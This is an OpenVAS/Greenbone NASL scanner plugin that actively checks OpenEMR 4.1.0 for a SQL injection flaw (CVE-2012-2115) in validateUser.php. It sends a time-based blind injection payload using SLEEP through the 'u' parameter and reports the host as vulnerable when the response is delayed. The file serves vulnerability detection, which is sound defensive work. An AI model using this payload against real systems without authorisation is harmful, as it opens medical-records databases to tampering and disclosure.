# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:open-emr:openemr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805345");
  script_version("2025-04-11T15:45:04+0000");
  script_cve_id("CVE-2012-2115");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-11 15:45:04 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-03-02 15:41:52 +0530 (Mon, 02 Mar 2015)");

  script_name("OpenEMR 'validateUser.php' SQLi Vulnerability - Active Check");

  script_tag(name:"summary", value:"OpenEMR is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Flaw is due to the validateUser.php script not properly
  sanitizing user-supplied input to the 'u' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject
  or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure
  of arbitrary data.");

  script_tag(name:"affected", value:"OpenEMR version 4.1.0 and possibly earlier.");

  script_tag(name:"solution", value:"Update to version 4.1.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Jan/27");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51247");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/sql-injection-vulnerability-in-openemr");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_openemr_http_detect.nasl");
  script_mandatory_keys("openemr/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

wait_extra_sec = 5;

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

# Added three times, to make sure its working properly
sleep = make_list(5, 7, 9);

# Use sleep time to check we are able to execute command
foreach sec (sleep) {

  url = dir + "/interface/login/validateUser.php?u='%2b(SELECT%201%20FROM%20"
            + "(SELECT%20SLEEP("+ sec +"))A)%2b'";

  req = http_get(item:url, port:port);
  start = unixtime();
  http_keepalive_send_recv(port:port, data:req);
  stop = unixtime();

  time_taken = stop - start;
  if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec))
    exit(0);
}

report = http_report_vuln_url(port:port, url:url);
security_message(port:port, data:report);
exit(0);
